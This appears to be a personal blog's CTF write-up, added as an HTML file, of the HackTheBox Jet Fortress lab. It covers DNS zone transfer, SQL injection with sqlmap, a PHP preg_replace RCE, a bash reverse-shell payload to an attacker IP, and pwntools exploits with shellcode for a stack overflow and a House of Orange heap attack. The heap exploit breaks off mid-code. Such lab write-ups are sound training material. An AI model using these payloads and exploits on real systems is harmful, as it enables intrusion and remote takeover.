@@ -1,0 +1,799 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="http://localhost:1337/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="http://localhost:1337/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="http://localhost:1337/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Initial Enumeration Nmap scanning &gt; nmap -sC -sV -oN jet.nmap 10.13.37.10 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="CTF: HackTheBox Jet Fortress"/>
+  <meta property="og:description" content="Initial Enumeration Nmap scanning &gt; nmap -sC -sV -oN jet.nmap 10.13.37.10 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="http://localhost:1337/ctf/htb/jet.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2023-12-13 18:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
+  <meta property="article:section" content="CTF"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; CTF: HackTheBox Jet Fortress</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="http://localhost:1337/">
+      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="http://localhost:1337/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+      <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick="loadStorkIndex()"/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="http://localhost:1337/">Home</a>
+
+  <a href="/categories.html">Categories</a>
+  <a href="/category/cheatsheet.html">Cheatsheets</a>
+  <a href="/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ctf/htb/jet">CTF: HackTheBox Jet Fortress</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#initial-enumeration" title="Initial Enumeration">Initial Enumeration</a><ul><li><a class="toc-href" href="#nmap-scanning" title="Nmap scanning">Nmap scanning</a></li><li><a class="toc-href" href="#10133710-directoryfiles-enumeration" title="10.13.37.10 Directory&amp;Files Enumeration">10.13.37.10 Directory&amp;Files Enumeration</a></li><li><a class="toc-href" href="#dns-enumeration" title="DNS Enumeration">DNS Enumeration</a></li></ul></li><li><a class="toc-href" href="#web-exploitation_1" title="Web Exploitation">Web Exploitation</a><ul><li><a class="toc-href" href="#wwwsecurewebincjet-directoryfiles-enumeration" title="www.securewebinc.jet Directory&amp;Files Enumeration">www.securewebinc.jet Directory&amp;Files Enumeration</a></li><li><a class="toc-href" href="#sql-injection" title="SQL Injection">SQL Injection</a></li><li><a class="toc-href" href="#rce-via-php-preg_replace" title="RCE via PHP preg_replace">RCE via PHP preg_replace</a></li></ul></li><li><a class="toc-href" href="#binary-exploitation_1" title="Binary Exploitation">Binary Exploitation</a><ul><li><a class="toc-href" href="#leak-buffer-overflow" title="leak - Buffer Overflow">leak - Buffer Overflow</a></li><li><a class="toc-href" href="#membermanager-heap-house-of-orange-attack" title="membermanager - Heap House of Orange attack">membermanager - Heap House of Orange attack</a></li><li><a class="toc-href" href="#memo-bof-canary-bypass-fastbin-duplication" title="Memo: BoF - Canary Bypass - Fastbin Duplication">Memo: BoF - Canary Bypass - Fastbin Duplication</a></li></ul></li><li><a class="toc-href" href="#cryptographic-attacks_1" title="Cryptographic Attacks">Cryptographic Attacks</a><ul><li><a class="toc-href" href="#xor-encryption" title="XOR Encryption">XOR Encryption</a></li><li><a class="toc-href" href="#weak-rsa-public-key" title="Weak RSA Public Key">Weak RSA Public Key</a></li></ul></li></ul></div>
+        </div>
+    <h2 id="initial-enumeration">Initial Enumeration</h2>
+<h3 id="nmap-scanning">Nmap scanning</h3>
+<blockquote>
+<p>&gt; nmap -sC -sV -oN jet.nmap 10.13.37.10<br/>
+<br/> </p>
+<p>PORT     STATE SERVICE     VERSION<br/>
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) <br/>
+| ssh-hostkey: <br/>
+|   2048 62:f6:49:80:81:cf:f0:07:0e:5a:ad:e9:8e:1f:2b:7c (RSA)<br/>
+|   256 54:e2:7e:5a:1c:aa:9a:ab:65:ca:fa:39:28:bc:0a:43 (ECDSA)<br/>
+|_  256 93:bc:37:b7:e0:08:ce:2d:03:99:01:0a:a9:df:da:cd (ED25519)<br/>
+53/tcp   open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)<br/>
+| dns-nsid: <br/>
+|_  bind.version: 9.10.3-P4-Ubuntu<br/>
+80/tcp   open  http        nginx 1.10.3 (Ubuntu)<br/>
+|_http-server-header: nginx/1.10.3 (Ubuntu)<br/>
+|_http-title: Welcome to nginx on Debian!<br/>
+5555/tcp open  freeciv?<br/>
+...<br/>
+7777/tcp open  cbt?<br/>
+...<br/>
+8080/tcp open  http-proxy?<br/>
+...<br/>
+9999/tcp open  http        SimpleHTTPServer 0.6 (Python 3.5.2)  </p>
+</blockquote>
+<p>First flag ("Connect"):</p>
+<h3 id="10133710-directoryfiles-enumeration">10.13.37.10 Directory&amp;Files Enumeration</h3>
+<blockquote>
+<p>&gt; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u 10.13.37.10<br/>
+...<br/>
+&lt;nothing&gt;</p>
+<p>&gt; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -u 10.13.37.10<br/>
+...<br/>
+&lt;nothing&gt;</p>
+</blockquote>
+<h3 id="dns-enumeration">DNS Enumeration</h3>
+<p>On port 53 a BIND server is listening with TCP enabled; typically this allows to perform <strong>zone transfers</strong>.</p>
+<p>First step is to try performing a full zone transfer (without specifying a domain):</p>
+<blockquote>
+<p>&gt; dig AXFR @10.13.37.10<br/>
+...<br/>
+&lt;nothing&gt;</p>
+</blockquote>
+<p>Not having any clue on what the domain could be, since the application server and the DNS server are the same, it's plausible to suppose that the DNS server has a record entry for a web application. Moreover, the presence of nginx suggests that there could be some virtual hosts.</p>
+<p>A reverse lookup on the 10.13.37.10 address is performed:</p>
+<blockquote>
+<p>&gt; dig -x 10.13.37.10 @10.13.37.10<br/>
+...<br/>
+;; AUTHORITY SECTION:<br/>
+37.13.10.in-addr.arpa. &nbsp;604800 &nbsp;IN &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SOA &nbsp;&nbsp;&nbsp;&nbsp;<strong>www.securewebinc.jet. securewebinc.jet</strong>. 3 604800 86400 2419200 604800  </p>
+</blockquote>
+<p>A domain is leaked: securewebinc.jet; retrying the zone transfer for that domain to leak additional domains.</p>
+<blockquote>
+<p>&gt; dig AXFR securewebinc.jet @10.13.37.10<br/>
+...<br/>
+securewebinc.jet.       604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 2 604800 86400 2419200 604800<br/>
+securewebinc.jet.       604800  IN      NS      www.securewebinc.jet.<br/>
+securewebinc.jet.       604800  IN      A       10.13.37.10<br/>
+www.securewebinc.jet.   604800  IN      A       10.13.37.10<br/>
+securewebinc.jet.       604800  IN      SOA     www.securewebinc.jet. securewebinc.jet. 2 604800 86400 2419200 604800   </p>
+</blockquote>
+<p>Adding www.securewebinc.jet and  securewebinc.jet to /etc/hosts</p>
+<blockquote>
+<p>&gt;sudo sh -c &nbsp;"echo '10.13.37.10 www.securewebinc.jet. securewebinc.jet' &gt;&gt; /etc/hosts"</p>
+</blockquote>
+<h2 id="web-exploitation_1">Web Exploitation</h2>
+<p>Navigating to www.securewebinc.jet - second flag ("Digging in..."):</p>
+<p><img alt="second-flag.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/second-flag.png"/></p>
+<h3 id="wwwsecurewebincjet-directoryfiles-enumeration">www.securewebinc.jet Directory&amp;Files Enumeration</h3>
+<blockquote>
+<p>&gt; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u www.securewebinc.jet<br/>
+...<br/>
+&lt;nothing interesting&gt;</p>
+<p>&gt; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -u www.securewebinc.jet 
+...<br/>
+&lt;nothing interesting&gt;</p>
+</blockquote>
+<p>From Burp:</p>
+<p><img alt="secret-web-directory.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/secret-web-directory.png"/></p>
+<p>Navigating to http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/ and getting redirected to a login.php page.</p>
+<h3 id="sql-injection">SQL Injection</h3>
+<p>The login form leaks the information about specified user existing:</p>
+<p><img alt="login-user-leak.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/login-user-leak.png"/></p>
+<p>The username field can be used to perform a SQL injection:</p>
+<p><img alt="sql-injection-1.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/sql-injection-1.png"/></p>
+<p>Manually testing payloads and noticing that after the '--' a space is needed to make the payload work.</p>
+<blockquote>
+<p>username='--+&amp;password=admin # Works<br/>
+username='--&amp;password=admin # Not works  </p>
+</blockquote>
+<p>Using sqlmap to extract information from the database:</p>
+<p>Databases:</p>
+<blockquote>
+<p>&gt; sqlmap -r $(readlink -f login.txt) --dbs<br/>
+[*] information_schema<br/>
+[*] jetadmin</p>
+</blockquote>
+<p>Tables:</p>
+<blockquote>
+<p>&gt; sqlmap -r $(readlink -f login.txt) -D jetadmin --tables<br/>
+[1 table]<br/>
++-------+<br/>
+| users |<br/>
++-------+</p>
+</blockquote>
+<p>Users Table Entries:</p>
+<blockquote>
+<p>&gt; sqlmap -r $(readlink -f login.txt) -D jetadmin -T users --dump<br/>
+[1 entry]<br/>
++----+------------------------------------------------------------------+----------+<br/>
+| id | password                                                         | username |<br/>
++----+------------------------------------------------------------------+----------+<br/>
+| 1  | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 | admin    |<br/>
++----+------------------------------------------------------------------+----------+  </p>
+</blockquote>
+<p>Cracking the admin password hash on crackstation.net:</p>
+<p><img alt="hash-cracking.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/hash-cracking.png"/></p>
+<p>The admin password is "Hackthesystem200".</p>
+<p>Getting the third flag ("Bypassing Authentication"):</p>
+<h3 id="rce-via-php-preg_replace">RCE via PHP preg_replace</h3>
+<p><img alt="third-flag.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/third-flag.png"/></p>
+<p>The "Send Email" form seems to apply a profanity filter before actually send any email; these filters, defined as hidden input for this form, consists into PHP regex.</p>
+<p><img alt="profanity-filter.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/profanity-filter.png"/></p>
+<p>If the server is running PHP 5.5.0 or older, it's possible to abuse regex manipulating the hidden form fields i.e. the POST request, to achieve a command execution - <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#rce-via-preg_replace">see there</a>.</p>
+<p><img alt="php-rce.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/php-rce.png"/></p>
+<p>Using the following payload to obtain a reverse shell:</p>
+<blockquote>
+<p>system("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/8090 0&gt;&amp;1'")</p>
+</blockquote>
+<p><img alt="fourth-flag.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/fourth-flag.png"/></p>
+<p>Got the fourth flag ("Command").</p>
+<h2 id="binary-exploitation_1">Binary Exploitation</h2>
+<p>Elevate the reverse shell to a fully interactive TTY.</p>
+<blockquote>
+<p>&gt; python3 -c 'import pty; pty.spawn("/bin/bash")'<br/>
+CTRL + Z<br/>
+stty raw -echo ; fg<br/>
+reset<br/>
+export TERM=xterm<br/>
+stty rows 56 columns 236  </p>
+</blockquote>
+<p>In the "home" directory, a binary with SUID privileges for the "alex" user is present.</p>
+<p><img alt="suid-alex-binary.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/suid-alex-binary.png"/></p>
+<h3 id="leak-buffer-overflow">leak - Buffer Overflow</h3>
+<blockquote>
+<p>&gt; checksec leak<br/>
+    Arch:     amd64-64-little<br/>
+    RELRO:    Partial RELRO<br/>
+    Stack:    No canary found<br/>
+    NX:       NX disabled<br/>
+    PIE:      No PIE (0x400000)<br/>
+    RWX:      <strong>Has RWX segments</strong> </p>
+</blockquote>
+<p>The binary has segments writable and executable at the same time.</p>
+<p><img alt="executable-stack.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/executable-stack.png"/></p>
+<p>The RWX segments is the stack itself; any code store into the stack would be executed if the attacker is able to manipulate the RIP making it pointing to the stored code.</p>
+<p>The binary leaks the stack pointer address (RSP); a shellcode is stored into the stack and the RIP is overridden with the leaked RSP address (the top of the stack) exploiting a buffer overflow vulnerability. 
+When the stack frame returns, the program executes the next instruction stored into the RIP register, executing the shellcode.</p>
+<p>The exploit code is the following:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#! /usr/bin/python3</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">ast</span> <span class="kn">import</span> <span class="n">literal_eval</span>
+
+<span class="c1">#p = process('./leak')</span>
+<span class="c1">#p = gdb.debug('./leak', 'continue') # type: pwnlib.tubes.process.process</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'10.13.37.10'</span><span class="p">,</span> <span class="mi">60099</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.3</span>
+
+<span class="c1"># Parse leaked address -&gt; Analyzing the stack, it appears to be the stack pointer address</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"Oops, I'm leaking! "</span><span class="p">)</span>
+<span class="n">leaked_rsp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>                
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt;"</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Leaked address: 0x</span><span class="si">{</span><span class="n">leaked_rsp</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">72</span> <span class="c1"># Minimum number of bytes required to overflow</span>
+
+<span class="n">shell_code</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05</span><span class="s1">'</span>
+
+<span class="n">nop</span> <span class="o">=</span> <span class="mi">16</span> <span class="c1"># Number of NOP bytes used for the nop sled </span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Constructing the payload..."</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x90</span><span class="s1">'</span> <span class="o">*</span> <span class="n">nop</span> <span class="o">+</span> <span class="n">shell_code</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shell_code</span><span class="p">)</span> <span class="o">+</span> <span class="n">nop</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leaked_rsp</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"Trigger Stack Smashing Attack!"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>A socket it's created to allow exploiting the remote binary:</p>
+<blockquote>
+<p>&gt; socat TCP4-LISTEN:60099,reuseaddr,fork EXEC:/home/leak,stderr</p>
+</blockquote>
+<p><img alt="leak-exploit.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/leak-exploit.png"/></p>
+<p>An ssh key pair is generated and the public key copied into alex/.ssh/authorized_keys:</p>
+<blockquote>
+<p>&gt; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0AOUIEB378G816WmHboGqEPCib...' &gt;&gt; alex/.ssh/authorized_keys</p>
+<p>&gt; ssh -i id_rsa alex@10.13.37.10</p>
+</blockquote>
+<p><img alt="fifth-flag.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/fifth-flag.png"/></p>
+<h3 id="membermanager-heap-house-of-orange-attack">membermanager - Heap House of Orange attack</h3>
+<p>This binary is obtained after the <a href="http://localhost:1337/ctf/htb/jet.html#xor-encryption">XOR cracking!</a></p>
+<p>The remote machine runs libc 2.23. The libc ELF and the linker are exported and used to replicate the server configuration when constructing the exploit.</p>
+<p>Since the binary is dynamically linked, it would use the system libc version when testing locally.</p>
+<blockquote>
+<p>&gt; ls ./libc<br/>
+-rwxr-xr-x 1 jack jack &nbsp;162632 13 dic 15.44 ld-2.23.so <br/>
+lrwxrwxrwx 1 jack jack &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10 13 dic 15.48 ld.so.2 -&gt; ld-2.23.so<br/>
+-rwxr-xr-x 1 jack jack 1868984 13 dic 15.43 libc-23.so<br/>
+lrwxrwxrwx 1 jack jack &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10 13 dic 15.48 libc.so.6 -&gt; libc-23.so </p>
+</blockquote>
+<p>The <em>patchelf</em> is used to force using the libc version exported from the server.</p>
+<blockquote>
+<p>&gt; patchelf --set-rpath ./libc membermanager
+&gt;  patchelf --set-interpreter ./libc/ld.so.2 membermanager</p>
+</blockquote>
+<p>This is confirmed by running:</p>
+<blockquote>
+<p>&gt; file membermanager
+membermanager: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, <strong>interpreter ./libc/ld.so.2</strong>, for GNU/Linux 2.6.24, BuildID[sha1]=a2fce2cac1b4244b993589775c7fe1b0d0b90fcf, stripped</p>
+</blockquote>
+<p>and </p>
+<blockquote>
+<p>&gt; checksec membermanager<br/>
+&nbsp;&nbsp;&nbsp;Arch: &nbsp;&nbsp;&nbsp;&nbsp;amd64-64-little<br/>
+&nbsp;&nbsp;&nbsp;RELRO: &nbsp;&nbsp;&nbsp;Full RELRO <br/>
+&nbsp;&nbsp;&nbsp;Stack: &nbsp;&nbsp;&nbsp;Canary found  <br/>
+&nbsp;&nbsp;&nbsp;NX: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NX enabled <br/>
+<em>PIE: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No PIE (0x3fa000)</em><br/>
+<strong>RUNPATH: &nbsp;b'./libc</strong></p>
+</blockquote>
+<p>Note that the binary is NOT PIE (<strong>Position Independent Executable</strong>); that means that every time the binary gets loaded into memory does NOT get placed into a different memory address <a href="https://ir0nstone.gitbook.io/notes/types/stack/pie">(see there)</a>. </p>
+<p>Analysing the binary it appears to be vulnerable to a <strong>one-byte overflow</strong> when using the "insecure edit" functionality; that means that an input of the attacker longer than the chunk size, would overflow by just one byte into the next chunk, overriding its <em>size</em> file.</p>
+<p>To achieve a command execution, the <em>House of Orange</em> technique it's used combining a vtable hijacking attack with an unsortedbin attack, abusing the one-byte overflow.</p>
+<p>Following the exploit used:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc/libc-23.so"</span><span class="p">)</span>
+<span class="n">gdb_script</span> <span class="o">=</span> <span class="s1">'''</span>
+<span class="s1">continue</span>
+<span class="s1">'''</span>
+<span class="c1">#p = gdb.debug("./membermanager", gdb_script) # type: pwnlib.tubes.process.process</span>
+<span class="c1">#p = process('./membermanager')</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'10.13.37.10'</span><span class="p">,</span> <span class="mi">5555</span><span class="p">)</span>
+<span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">p</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mf">0.3</span>
+
+<span class="k">def</span> <span class="nf">SetUsername</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"enter your name:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"6. exit</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ChangeName</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"4"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"enter new name:"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"6. exit</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">GetGift</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"5"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"your gift:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"6. exit</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">result</span>
+
+<span class="k">def</span> <span class="nf">AddUser</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">index</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"size:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"username:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">if</span> <span class="ow">not</span> <span class="nb">type</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">bytes</span> <span class="k">else</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"6. exit</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="n">index</span> <span class="o">-</span> <span class="mi">1</span>
+
+<span class="k">def</span> <span class="nf">SafeEdit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2. insecure edit"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"index:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"new username:</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
